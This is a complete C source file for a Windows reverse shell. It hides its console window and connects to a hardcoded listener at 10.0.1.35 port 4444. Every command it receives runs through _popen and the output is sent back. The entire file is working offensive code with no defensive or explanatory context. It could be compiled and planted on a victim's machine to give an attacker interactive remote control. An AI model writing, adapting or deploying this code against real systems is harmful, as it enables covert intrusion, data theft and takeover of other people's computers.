#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_COMMAND_LENGTH 1024

// Hardcoded LHOST (IP) and LPORT (port)
#define LHOST "10.0.1.35"
#define LPORT 4444

// Function to initialize Winsock
void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        exit(1);
    }
}

// Function to clean up Winsock
void cleanup_winsock() {
    WSACleanup();
}

// Function to execute commands and return output
void execute_command(SOCKET client_socket, const char* command) {
    char buffer[MAX_COMMAND_LENGTH];
    FILE* fp;

    // Open the process for the command execution
    fp = _popen(command, "r");
    if (fp == NULL) {
        strcpy(buffer, "Failed to execute command");
        send(client_socket, buffer, strlen(buffer), 0);
        return;
    }

    // Read the command output and send it back to the server
    while (fgets(buffer, MAX_COMMAND_LENGTH, fp) != NULL) {
        send(client_socket, buffer, strlen(buffer), 0);
    }

    // Close the file pointer after command execution
    fclose(fp);
}

// Function to handle the reverse shell connection
void reverse_shell() {
    SOCKET client_socket;
    struct sockaddr_in server_addr;
    char buffer[MAX_COMMAND_LENGTH];
    int bytes_received;

    // Create socket
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET) {
        exit(1);
    }

    // Prepare server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(LPORT);
    server_addr.sin_addr.s_addr = inet_addr(LHOST);

    // Connect to the server
    if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        exit(1);
    }

    // Once connected, wait for commands from the server
    while (1) {
        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH, 0);
        if (bytes_received <= 0) {
            break; // Connection lost or server closed connection
        }

        buffer[bytes_received] = '\0'; // Null-terminate the command

        // If the received command is "exit", break the loop
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        // Execute the received command and send the result back
        execute_command(client_socket, buffer);
    }

    // Close the socket when done
    closesocket(client_socket);
}

int main() {
    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Initialize Winsock
    init_winsock();

    // Start the reverse shell
    reverse_shell();

    // Clean up Winsock
    cleanup_winsock();

    return 0;
}
